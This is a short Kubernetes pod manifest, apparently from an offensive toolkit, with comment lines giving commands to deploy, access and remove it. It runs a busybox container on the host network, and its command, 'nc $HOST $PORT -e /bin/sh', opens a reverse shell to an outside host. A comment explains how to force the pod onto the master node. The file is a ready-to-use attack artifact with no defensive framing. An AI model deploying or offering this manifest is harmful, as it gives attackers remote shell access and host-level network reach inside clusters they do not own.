###########################################################
## Deploy: kubectl -n [namespace] apply -f pod-hostnetwork-only.yaml 
## Access: kubectl -n [namespace] exec -it pod-hostnetwork -- bash
## Remove: kubectl -n [namespace] delete -f pod-hostnetwork-only.yaml
###########################################################
apiVersion: v1
kind: Pod
metadata:
  name: pod-hostnetwork
  labels:
    app: hostnetwork
spec:
  hostNetwork: true
  containers:
  - image: busybox
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "nc $HOST $PORT  -e /bin/sh;" ]
    imagePullPolicy: IfNotPresent
    name: hostnetwork
  # Force scheduling of your pod on master mode by uncommenting this line and changing the name
  #nodeName: k8s-master
  restartPolicy: Always